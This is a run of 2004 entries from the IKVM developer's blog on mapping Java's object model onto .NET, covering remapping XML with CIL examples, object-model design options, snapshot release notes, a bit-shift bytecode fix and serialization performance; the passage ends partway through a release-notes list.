		<P>Stuart commented:<BR><I>I'm not convinced that cli.System.Object should be visible to Java at all. AIUI, Java code will never see instances of cli.System.Object, because all such objects appear to inherit from java.lang.Object instead.<BR><BR>If cli.System.Object *is* visible to Java code, it introduces a paradox: java.lang.Object inherits from cli.System.Object (per the way it's actually implemented) but cli.System.Object should appear to inherit from java.lang.Object (per Java's rule that *everything* inherits from java.lang.Object). Now, it may be possible to create magic glue code that inverts the apparent inheritance relationship like that, but do you really want to go there? :)</I></P>
<P>The inversion is exactly what I was thinking about. Stuart's analysis above contains a crucial mistake, java.lang.Object does not inherit from cli.System.Object. However, it is virtually impossible not to get confused about this stuff, so let's try to make the discussion a little easier by defining a naming convention:</P>
<UL>
<LI><B>java.lang.Object</B><BR>This is the base class of all Java classes (as seen from the Java side of the world).</LI>
<LI><B>[classpath]java.lang.Object</B><BR>This is an implementation artifact of IKVM, it is a .NET type that is used as the base type for all non-remapped Java classes.</LI>
<LI><B>System.Object</B><BR>This is the base class of all .NET classes (as seen from the .NET side of the world).</LI>
<LI><B>cli.System.Object</B><BR>This is the IKVM manifestation of the System.Object type on the Java side of the world.</LI></UL>
<P align=left>The paradox is that <B>[classpath]java.lang.Object</B> inherits from <B>System.Object</B> and <B>cli.System.Object</B> inherits from <B>java.lang.Object</B>, but hopefully it is now clear that this isn't a problem. (BTW, one of the <A href="http://www.yourdictionary.com/ahd/p/p0057700.html"><STRONG>definitions of a paradox</STRONG></A> is "A seemingly contradictory statement that may nonetheless be true").</P>
<P align=left>There are actually two reasons why I would want to do this:</P>
<OL>
<LI>
<P align=left>If a Java class extends a .NET type (that was exported using netexp) you see both the virtual methods in <B>java.lang.Object</B> as well as the ones in <B>System.Object</B> that the class in question happens to override (a fairly arbitrary set). By introducing <B>cli.System.Object</B> as the <A href="http://www.yourdictionary.com/ahd/p/p0175300.html"><STRONG>penultimate</STRONG></A> base class for all .NET types, this can be made much more consistent. <B>cli.System.Object</B> would have final implementations for all the virtual methods in <B>java.lang.Object</B> (to make sure that the essentially non-existing methods don't get overridden) and it would introduce the real virtual methods of System.Object.</P></LI>
<LI>
<P align=left>If you want to define your own "first class" .NET exception class in Java, you need to extend cli.System.Exception. In other words, it makes for a more powerful programming model to expose the remapped types in this way.</P></LI></OL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/10/2004 10:15:16 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=07bca016-be8a-4174-878f-e451243c0ff9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=07bca016-be8a-4174-878f-e451243c0ff9">Comments [6]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 09 March 2004</h2></div>
<div class="newsItems"><a name="aa9231d5c-8626-4a13-9be7-5b02592df161"></a><div class="entry">
	<h3 class="entryTitle">Object Model Mapping Part 4</h3>
	<div class="entryBody">
		<P>Yesterday I checked in a major change set that implements the new object model mapping infrastructure. Today I put the new snapshots online as well. The new implementation is about a thousand lines less code than the previous.</P>
<P><B>What's new</B></P>
<UL>
<LI>Many code changes to implement the new model. 
<LI>When compiling classpath.dll, ikvmc now requires the <I>-remap:map.xml</I> option. This is the only time the mapping information is read from the XML. When code actually runs, or when other classes are compiled, the remapping information is read from custom attributes in classpath.dll. 
<LI>Tracing infrastructure. Interesting points in the runtime now contain <A href="http://msdn.microsoft.com/library/en-us/cpref/html/frlrfsystemdiagnosticstraceclasstopic.asp">trace</A> calls that can be enabled with a command line switch (or <A href="http://msdn.microsoft.com/library/en-us/vbcon/html/vbconconfigurationoftraceswitches.asp?frame=true">app.config setting</A>). In addition, when Java code is compiled it can optionally be instrumented so that each method called writes its name and signature to the tracer. This has a big performance impact (it will be optimized a little bit in the future, but don't expect too much), so it is not enabled for classpath.dll, by default. 
<LI>classpath.dll now contains the remapped types (java.lang.Object, java.lang.Throwable, java.lang.String and java.lang.Comparable). This means that if you want to create a Java like class in C# you can now extend java.lang.Object. Note however that you should never define your references as java.lang.Object, use System.Object instead. If you want to call a java.lang.Object instance method on a System.Object reference, use the corresponding static instancehelper method on java.lang.Object.</LI></UL>
<P><B>Finalization</B></P>
<P>From the Java side of the fence, finalization continues to work as it always has, but when C# code is subclassing Java code, you should use the C# destructor if you need finalization. If you override the finalize method, you run the risk that it isn't called (it only gets called if one of your Java base classes actually overrides it). The C# destructor does the right thing. If you use another .NET language, you have to override Finalize and make sure that you call the base class Finalize. More complicated mixed scenarios (e.g. Java code subclassing C# code that subclasses Java code) are not supported at the moment (wrt finalization, other aspects should work fine).</P>
<P><B>What's next?</B></P>
<P>It's not quite done yet, but I'll be going through a stabilization phase before making any more changes. I have some ideas for changes to the way the remapped .NET types appear on the Java side (e.g. should it be possible to extend cli.System.Object in Java?). There are also some optimizations that can be done and there still remains some restructuring to be done.</P>
<P><B>Snapshots</B></P>
<P>I've tested this snapshot pretty well, but considering the scale of the changes, I expect some regressions. Bug reports are appreciated (as always).</P>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip">just the binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source plus binaries</A>.</P>
<P><B>Conferences</B></P>
<P>Next month I'm speaking again at the <A href="http://roots.dnd.no/">rOOts</A> conference in Bergen, Norway, where I had a very good time last year. Come and say hi if you're there. Also, I'm happy to be speaking again at the excellent (and fun) <A href="http://www.softwaresummit.com/">Colorado Software Summit</A> in Keystone, Colorado in October.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/09/2004 10:42:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a9231d5c-8626-4a13-9be7-5b02592df161"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a9231d5c-8626-4a13-9be7-5b02592df161">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 03 March 2004</h2></div>
<div class="newsItems"><a name="aee561bf5-3b49-4c6a-8778-db1466af1ea0"></a><div class="entry">
	<h3 class="entryTitle">Object Model Mapping Part 3</h3>
	<div class="entryBody">
		<P>A brief update on the progress and some random thoughts on remapping. Today I got classpath.dll to build (and verify) for the first time using the new remapping infrastructure. Finally some progress. However, there is still some more work to do before it runs again.</P>
<P>Part of the new model is that there are now two different type wrappers (the internal class that contains the meta data of an IKVM type) for the remapped types. There is one type wrapper that is used during static compilation (RemapperTypeWrapper) and another one that is used during at runtime (CompiledTypeWrapper, also used for normal (i.e. non-remapped) statically compiled classes). The advantage of this is that there is less overhead at runtime and the code is also a bit less complex. This is also the final step in an invisible process that has been going on for a long time. It is now no longer possible to run IKVM without a statically compiled classpath.dll (it hasn't been possible for a while, but theoretically it could have been made to work). When I just got started, there was no static compiler yet and the only way&nbsp;for it to work was to load all classes dynamically, after the static compiler started to work, support for dynamically loading the core classes began to degenerate. That degeneration is now final and there is no way back ;-)</P>
<P><B>What's next?</B></P>
<P>More metadata needs to be emitted on the remapped types and CompiledTypeWrapper needs to be changed to understand it. The code needs to be cleaned up. I'm not sure yet, but I think a lot of complexity can be removed now. Virtual method invocation needs to be optimized. At the moment all virtual method call to remapped types go through the helper methods, but this is only needed is the reference type is not know to be a Java subclass. For example, calling java.lang.Object.toString() on a java.lang.Object reference requires the call to go through the helper method, but calling java.lang.Object.toString() on java.lang.Math (this is just a random example) doesn't need to go through the helper method.</P>
<P>Of course, there are also various loose ends that need to be tied up, but I think I'm on track to have a working version sometime next week.</P>
<P><B>More FOSDEM</B></P>
<P>Patrik posted an <A href="http://www.gnu.org/software/classpath/events/fosdem04.html">overview</A> of the FOSDEM Java talks. It also includes links to the slides for some of the talks.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/03/2004 20:59:25 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ee561bf5-3b49-4c6a-8778-db1466af1ea0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ee561bf5-3b49-4c6a-8778-db1466af1ea0">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 01 March 2004</h2></div>
<div class="newsItems"><a name="a46c557f9-665a-4d38-9c04-bb7a0ea18adf"></a><div class="entry">
	<h3 class="entryTitle">Object Model Mapping Part 2</h3>
	<div class="entryBody">
		<p>In 
<a HREF="/PermaLink.aspx?guid=c16bd06c-1c46-4255-a05f-6625cae7d816">
yesterday's entry</a> I didn't get to the stuff that kept me going in circles 
last week. I had decided on the mixed model a few months ago, but as usual the 
devil is in the details.</p>
<p>Initially I wanted to keep the map.xml format more or less the same and I 
think that put me on the wrong track. Let's start by taking a look at some of the 
current map.xml features. Within the &lt;class&gt; tag there are &lt;constructor&gt; and 
&lt;method&gt; tags. These can contain several different child tags:</p>
<ul>
 <li>Empty (i.e. no child tags)<br>
 The method is identical to the corresponding method in the underlying type. 
 Example: The constructor of java.lang.Object is identical to the constructor 
 of System.Object, so the tag looks like this:<br>
 &lt;constructor sig=&quot;()V&quot; modifiers=&quot;public&quot; /&gt;</li>
 <li>&lt;redirect&gt;<br>
 The method is redirected to another method. This can be a static method in a 
 helper class or a static or instance method in the underlying type. Example: 
 java.lang.Object.notifyAll() is redirected to 
 System.Threading.Monitor.PulseAll():<br>
 &lt;method name=&quot;notifyAll&quot; sig=&quot;()V&quot; modifiers=&quot;public final&quot;&gt;<br>
&nbsp;&nbsp;&nbsp; &lt;redirect class=&quot;System.Threading.Monitor, mscorlib&quot; 
 name=&quot;PulseAll&quot; sig=&quot;(Ljava.lang.Object;)V&quot; type=&quot;static&quot; /&gt;<br>
 &lt;/method&gt;</li>
 <li>&lt;invokespecial&gt;<br>
 If the method is invoked using the <i>invokespecial </i>bytecode, this CIL 
 sequence is emitted. Example: java.lang.Object.wait() is implemented by 
 calling System.Threading.Monitor.Wait(), but Monitor.Wait returns a boolean 
 that has to be discarded:<br>
 &lt;method name=&quot;wait&quot; sig=&quot;()V&quot; modifiers=&quot;public final&quot;&gt;<br>
&nbsp;&nbsp;&nbsp; &lt;invokespecial&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;call type=&quot;System.Threading.Monitor, 
 mscorlib&quot; name=&quot;Wait&quot; sig=&quot;(Ljava.lang.Object;)Z&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;pop /&gt;<br>
&nbsp;&nbsp;&nbsp; &lt;/invokespecial&gt;<br>
 &lt;/method&gt;</li>
 <li>&lt;invokevirtual&gt;<br>
 Similar to &lt;invokespecial&gt;, but this defines the CIL that is emitted when 
 the <i>invokevirtual </i>bytecode is used to call the method.</li>
<li>&lt;override&gt;<br>
Specifies that this method conceptually overrides the method named in the 
&lt;override&gt; tag. I say &quot;conceptually&quot; because in the equivalence model there is 
no real class. However, if a real subclass would override this method, it would 
actually be overriding the method named in the override tag. Example: 
java.lang.Object.hashCode() overrides System.Object.GetHashCode:<br>
&lt;method name=&quot;hashCode&quot; sig=&quot;()I&quot; modifiers=&quot;public&quot;&gt;<br>
&nbsp;&nbsp;&nbsp; &lt;override name=&quot;GetHashCode&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp; &lt;invokevirtual&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;dup /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;isinst type=&quot;System.String, 
mscorlib&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;brfalse name=&quot;skip&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;castclass type=&quot;System.String, 
mscorlib&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;call class=&quot;java.lang.StringHelper&quot; 
name=&quot;hashCode&quot; sig=&quot;(Ljava.lang.String;)I&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;br name=&quot;end&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;label name=&quot;skip&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;callvirt type=&quot;System.Object, 
mscorlib&quot; name=&quot;GetHashCode&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;label name=&quot;end&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp; &lt;/invokevirtual&gt;<br>
&lt;/method&gt;</li>
 <li>&lt;newobj&gt;<br>
Used in constructors to define the CIL that is emitted when a new instance is 
created. Example: java.lang.String has a default constructor, but System.String 
doesn't:<br>
&lt;constructor sig=&quot;()V&quot; modifiers=&quot;public&quot;&gt;<br>
&nbsp;&nbsp;&nbsp; &lt;newobj&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;ldstr value=&quot;&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;call type=&quot;System.String, mscorlib&quot; 
name=&quot;Copy&quot; /&gt;<br>
&nbsp;&nbsp;&nbsp; &lt;/newobj&gt;<br>
&lt;/constructor&gt;</li>
</ul>
<p>The thing to note is that some of the remapping implications are still 
handled manually in this scheme. For example, the &lt;invokevirtual&gt; of 
Object.hashCode has to check for string instances. This information can be 
derived from the remapping file and it shouldn't be necessary to do this 
explicitly.</p>
<p>I didn't really like the &lt;invokespecial&gt; and &lt;invokevirtual&gt; constructs and I 
explored the idea of only having a &lt;body&gt; tag that contains the method body. 
However, it soon became clear that that wouldn't be enough. For example, the 
implementation of java.lang.Object.clone needs to call the protected method 
System.Object.MemberwiseClone and this is only allowed in subclasses. So it 
wouldn't be possible to generate a verifiable helper method for that.</p>
<p>The obvious solution (in hindsight) came to me when I realised that there are 
actually two types of &quot;subclasses&quot; of java.lang.Object, the ones that really 
extend java.lang.Object (our generated .NET type) and the ones that don't (e.g. 
arrays, System.String and all other .NET types). I knew this before, of course, 
but I was trying to make the model too general. After this realisation, it 
became obvious that every method should have a &lt;body&gt; and an &lt;alternateBody&gt; 
(tentative names).</p>
<p>After I've modified the remapping engine to automatically handle all the 
overridden method implications, the &lt;alternateBody&gt; construct will not be needed 
for many methods. I think only for Object.clone and Object.finalize and both 
will be trivial. The &lt;alternateBody&gt; for clone will throw a 
CloneNotSupportedException (it could also check if the object implements 
ICloneable and if so, invoke that Clone method, but does this really help?) and 
the &lt;alternateBody&gt; for finalize will simply be empty, since there is no good 
reason to ever explicitly invoke the Finalize method of a .NET type.</p>
<p>As an aside, I'm also going to remove the &lt;redirect&gt; construct, because it 
doens't really add any value. It's just as easy to have a &lt;body&gt; with a &lt;call&gt;.</p>
<p>I'm not clear on the performance implications of these changes. In the 
existing model, many of the remapping constructs are inlined, but in the new 
model they won't be, <i>invokespecial </i>will end up calling the real method in 
the new classes and <i>invokevirtual </i>will call the static helper method. 
This will probably be slightly slower, but I think the other advantages easily 
outweigh this.</p>
<p>Another advantage of this scheme that I didn't yet mention is that reflection 
on remapped methods is now trivial. Currently, the following program doesn't work 
on IKVM, in the new model the call would simply end up at the static helper 
method for clone:</p>
<pre>class ReflectClone
{
  public static void main(String[] args) throws Exception
  {
    java.lang.reflect.Method m;
    m = Object.class.getDeclaredMethod("clone", new Class[0]);
    m.setAccessible(true);
    System.out.println(m.invoke(args, new Object[0]));
  }
}</pre>
<p>BTW, I originally tried this by getting the public clone method on the array 
class, but oddly enough on the Sun JVM array types don't appear to have a public 
clone method (even though you can call it just fine!).</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/01/2004 10:59:33 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=46c557f9-665a-4d38-9c04-bb7a0ea18adf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=46c557f9-665a-4d38-9c04-bb7a0ea18adf">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 29 February 2004</h2></div>
<div class="newsItems"><a name="ac16bd06c-1c46-4255-a05f-6625cae7d816"></a><div class="entry">
	<h3 class="entryTitle">Object Model Mapping</h3>
	<div class="entryBody">
		<P>After suffering from coder's block (if that's the programmer's equivalent of writer's block) for weeks, I finally got started the past week on the new object model remapping infrastructure. I spent most of the week going in circles. Writing code, deleting it, writing more code, deleting it again. However, I think I figured it out now. To test that theory I decided to write a blog entry about it. Explaining something is usually a good way to find holes in your own understanding.</P>
<P>I'm going to start out by describing the problem. Then I'll look at the existing solution and it's limitations. Finally I'll explain the new approach I came up with. If everything goes well, by end the of the entry you'll be wondering "<I>why did it take him so long to come up with this, it's obvious!</I>". That means I came up with the right solution and I explained it well.</P>
<P>Note that I'm ignoring ghost interfaces in this entry. The current model will stay the same. For details, see the <A HREF="/PermaLink.aspx?guid=773aee9b-a5ad-412b-af85-41e68fb2e650">previous entries</A> on <A HREF="/PermaLink.aspx?guid=4a4bcc69-174f-40af-bb16-85227b87acc0">ghost interfaces</A>.</P>
<P>What are the goals?</P>
<UL>
<LI>We need a way to have the Java object model fit into the .NET model</LI>
<LI>We would like to enable full interoperability between the two models</LI>
<LI>Performance should be acceptable</LI>
<LI>Implementation shouldn't be overly complex</LI></UL>
<P>The .NET model (relevant types only):</P>
<P><IMG height=205 src="http://www.frijters.net/dotnetoom.gif" width=445 border=0></P>
<P>For comparison, here is the Java model that we want to map to the .NET model:</P>
<P><IMG height=133 src="http://www.frijters.net/javaoom.GIF" width=445 border=0></P>
<P>There are several possible ways to go (I made up some random names):</P>
<UL>
<LI><I>Equivalence<BR></I>This is the current model. The Java classes are mapped to the equivalent .NET types. This works because System.Object has mostly the same virtual methods as java.lang.Object. For the java.lang.Throwable to System.Exception, a little more work is needed and that is where the java.lang.Throwable$VirtualMethods interface comes in. When a virtual method on Throwable is called through a System.Exception reference, the compiler calls a static helper method in Throwable$VirtualMethodsHelper that checks if the passed object implements the Throwable$VirtualMethods interface and if so, it calls the interface method, if not, it calls the Throwable implementation of the method (i.e. it considers the method not overridden by a subclass). A downside of using an interface for this is that all interface methods must be public, at the moment this isn't a problem because all virtual methods (except for clone and finalize derived from Object) in Throwable are public, but it could become a problem later on.</LI>
<LI><I>Extension<BR></I>This is a fairly straightforward approach where java.lang.Object extends System.Object and the Java array, String and Throwable classes are simply subclasses of java.lang.Object. It is easy to implement. The obvious downsides are that arrays will be slow (extra indirection), Strings need to be wrapped/unwrapped when doing interop with .NET code and Throwable is not a subclass of System.Exception (the CLI supports this, but once again not a good idea for interop).</LI>
<LI><I>Wrapping<BR></I>I apologise in advance, because I probably can't explain this one very well (because it doesn't make any sense to me). Many people have actually suggested this model. In the model java.lang.Object extends System.Object, but arrays, String and Throwable do not extend java.lang.Object, instead whenever an instance of those types is assigned to a java.lang.Object reference, it is wrapped in an instance of a special java.lang.Object wrapper class. The downside of this model is that wrapping and unwrapping is expensive and (and this is why I don't like this approach at all) that the expense is paid in ways that are very unexpected to the Java programmer (who expects simple assignment to be expensive?).</LI>
<LI><I>Mixed<BR></I>This is the new model. Explanation follows below.</LI></UL>
<P><B>What's wrong with equivalance?</B></P>
<P>Both J# and the current version of IKVM use equivalence (although many of the details differ and J# doesn't consider Throwable and System.Exception to be equivalent) and it works well. So why change it? There are four advantages to the mixed model:</P>
<UL>
<LI>Interop works better<BR>In the current model, if you subclass a Java class from C# and you want to override Object.equals, depending on whether any of the base classes overrides Object.equals you need tot override either Equals or equals. If you want to call Throwable.getStackTrace() from C# on a reference of type System.Exception there is no obvious way to do that.</LI>
<LI>More efficient representation of remapping model<BR>Currently every subclass of java.lang.Object overrides toString() to call ObjectHelper.toStringSpecial, this is needless code bloat. More importantly, before any classes can be resolved the map.xml remapping information needs to be parsed and interpreted (to know about java.lang.Object, java.lang.String and java.lang.Throwable). In the new model, java.lang.Object, java.lang.String and java.lang.Throwable will be in the classpath.dll, so they can be resolved on demand. The classes will be decorated with custom attributes to explain to the runtime that they are special, but no other metadata will need to be parsed or interpreted.</LI>
<LI>Cleaner model<BR>java.lang.ObjectHelper and java.lang.StringHelper no longer need to be public and the various $VirtualMethod helper types aren't needed anymore.</LI>
<LI>Easier to get right<BR>There are a few subtle bugs in the current implementation. Try the following for example:<PRE>class ThrowableToString
{
  public static void main(String[] args) throws Exception
  {
    String s = "cli.System.NotImplementedException";
    Object o = Class.forName(s).newInstance();
    Throwable t = (Throwable)o;
    System.out.println(o.toString());
    System.out.println(t.toString());
  }
}
</PRE>It prints out:<BR>System.NotImplementedException: The method or operation is not implemented.<BR>cli.System.NotImplementedException: The method or operation is not implemented.<BR>&nbsp; 
<P>Obvously, both lines should be the same. Another (at the moment theoretical) problem is that it is legal for code in the java.lang package to call Object.clone or Object.finalize (both methods are <I>protected</I>, but in Java, <I>protected </I>also implies package access), currently that wouldn't work.</P></LI></UL>
<P>Here is the mixed model I ended up with:</P>
<P><IMG height=205 src="http://www.frijters.net/mixedoom.GIF" width=445 border=0></P>
<P>I called it <I>mixed </I>because it combines some features of <I>equivalence </I>and <I>extension</I>. For example, references of type java.lang.Object are still compiled as System.Object (like in the equivalence model), but the non-remapped Java classes extend java.lang.Object (like in the extension model).</P>
<P>java.lang.Object will contain all methods of the real java.lang.Object and in addition to those also a bunch of static helper methods that allow you to call java.lang.Object instance methods on System.Object references. The helper methods will test if the passed object is either a java.lang.Object or a java.lang.Throwable (for virtual methods) and if so, it will downcast and call the appropriate method on those classes, if not, it will perform an alternative action (that was specified in map.xml when this classpath.dll was compiled).</P>
<P>Object.finalize requires some special treatment since we don't want java.lang.Object.finalize to override System.Object.Finalize because that would cause all Java objects to end up on the finalizer queue and that's very inefficient. So the compiler will contain a rule to override System.Object.Finalize when a Java class overrides java.lang.Object.finalize.</P>
<P>I glossed over a lot of details, but those will have to wait for next time.</P>
<P><B>FOSDEM 2004</B></P>
<P>Finally a short note on FOSDEM (Free and Open Source Software Developer's Meeting). Last weekend I visisted <A href="http://www.fosdem.org/">FOSDEM</A> in Brussels. I enjoyed seeing Dalibor, Chris, Mark, Sascha and Patrik <A HREF="/PermaLink.aspx?guid=c69de097-f0a3-4018-9ba7-f04f6f743d46">again</A> and I also enjoyed meeting <A href="http://gcc.gnu.org/java/">gjc</A> hackers Tom Tromey and Andrew Haley for the first time. Mark wrote up a nice <A href="http://mail.gnu.org/archive/html/classpath/2004-02/msg00051.html">report</A> about it. If you haven't read it yet, go read it now. All in all a very good and productive get-together.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/29/2004 15:43:01 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c16bd06c-1c46-4255-a05f-6625cae7d816"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c16bd06c-1c46-4255-a05f-6625cae7d816">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 18 February 2004</h2></div>
<div class="newsItems"><a name="ae958d170-4249-4f8a-b036-949ab1d1fecf"></a><div class="entry">
	<h3 class="entryTitle">F.A.Q.</h3>
	<div class="entryBody">
		<P>Stuart pointed out the <A HREF="/story.aspx/faq">F.A.Q.</A> was out of date, so I updated it a little bit. He also asked:</P>
<P><I>Speaking of which, I noticed while perusing the FAQ that the JIT compiler is included in IK.VM.NET.dll which means it's required for running even statically-compiled code. For apps that don't use clever classloading tricks, the JIT isn't needed at all when everything's been statically compiled. Would it be possible to separate the JIT out into a different DLL to reduce the necessary dependencies for a statically-compiled Java app?<BR><BR>Sure, the 275K of IK.VM.NET.dll is miniscule compared to the 3Mb of classpath.dll, but it's the principle of the thing ;)</I></P>
<P>This is definitely something I want to do. In fact, I would also like to have the option to only include parts of the Classpath code when statically compiling a library. So instead of having a dependency on classpath.dll, you'd suck in only the required classes.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/18/2004 09:36:11 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e958d170-4249-4f8a-b036-949ab1d1fecf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e958d170-4249-4f8a-b036-949ab1d1fecf">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 16 February 2004</h2></div>
<div class="newsItems"><a name="af7f1383b-ffc3-4957-b793-3ff71e590587"></a><div class="entry">
	<h3 class="entryTitle">Jikes 1.19, Bytecode Bug, Serialization and a New Snapshot</h3>
	<div class="entryBody">
		&nbsp; 
<P><B>Jikes</B></P>
<P>I upgraded to <A href="http://www-124.ibm.com/developerworks/forum/forum.php?group_id=10&amp;forum_id=684">Jikes 1.19</A> that was released recently. It didn't like the netexp generated stub jars (which is good, because it turns out they were invalid), so I fixed netexp to be better behaved in what it emits. Jikes didn't like the fact that the inner interfaces that I created had the ACC_STATIC modifier set at the class level, rightly so, but the error message it came up with was very confusing. Along the way I also discovered that it is illegal for constructors to be marked <I>native </I>(kind of odd, I don't really see why you couldn't have a native constructor). So I made them non-native and have a simple method body that only contains a return. That isn't correct either (from the verifier's point of view) and I guess I should change it to throw an UnsatifiedLinkError. That would also be more clear in case anyone tries to run the stubs on a real JVM.</P>
<P>Jikes 1.19 has a bunch of new pedantic warnings (some enabled by default). I don't think this is a helpful feature at&nbsp; the moment. Warnings are only useful if you can make sure you don't get any (by keeping your code clean), but when you already have an existing codebase, this is very hard and in the case of Classpath, where you have to implement a spec, you often don't have the option to do the right thing. So I would like to have to option to have lint like comment switches to disable specific warnings in a specific part of the code.</P>
<P><B>Bytecode Bug</B></P>
<P>I also did some work to reduce the number of failing Mauve testcases on IKVM and that caused me to discover that the bit shifting instructions were broken (oops!). On the JVM the shift count is always masked by the number of bits (-1) in the integral type you're shifting. So for example:</P><PRE>int i = 3;
System.out.println(i &lt;&lt; 33);</PRE>
<P>This prints out 6 ( 3 &lt;&lt; (33 &amp; 31)). On the CLI, if the shift count is greater than the number of bits in the integral type, the result is undefined. I had to fix the bytecode compiler to explicitly do the mask operation. </P>
<P><B>Serialization</B></P>
<P>Brian J. Sletten reported on the mailing list that deserialization was extremely slow. That was caused by the fact that reflection didn't cache the member information for statically compiled Java classes or .NET types. I fixed that and after that I also made some improvements to GNU Classpath's ObjectInputStream to speed it up even more. It's still marginally slower than the Sun JRE, but the difference shouldn't cause any problems.</P>
<P><B>Snapshot</B></P>
<P>I made a new snapshot. Here's what's new:</P>
<UL>
<LI>Changed classpath.build to disable jikes warnings (I know it's lame, but I grew tired of the useless warnings). I also added the -noTypeInitWarning option to ikvmc, to get rid of all the warning about running type initializers. 
<LI>Implemented accessibility checks for Java reflection. 
<LI>Cleaned up socket code and implemented all of the socket options (well, except for IP_MULTICAST_IF2). 
<LI>Implemented Get###ArrayRegion/Set###ArrayRegion and GetPrimitiveArrayCritical/SetPrimitiveArray JNI functions. 
<LI>Added all the 1.4 functions to the JNIEnv vtable. 
<LI>Implemented support for field name overloading (a single class can have several different fields with the same name, if the types are different). 
<LI>Changed the class format errors thrown by ClassFile.cs to .NET exception, instead of Java exception, to have better error handling in ikvmc. 
<LI>Changed VMClass.getWrapperFromClass to use a delegate instead of reflection, to speed up reflection. 
<LI>Fixed the compiler to mask shift counts for ishl, lshl, iushr, lushr, ishr, lshr bytecodes. 
<LI>Fixed a bug in ghost handling (the bug could cause a "System.NotSupportedException: The invoked member is not supported in a dynamic module." exception). 
<LI>Added EmitCheckcast and EmitInstanceOf virtual functions to TypeWrapper. 
<LI>Added a LazyTypeWrapper base class for DotNetTypeWrapper and CompiledTypeWrapper, to cache the member information to speed up reflection. 
<LI>Improved error handling in ikvmc. 
<LI>Fixed netexp to generate valid (or less invalid) classes. 
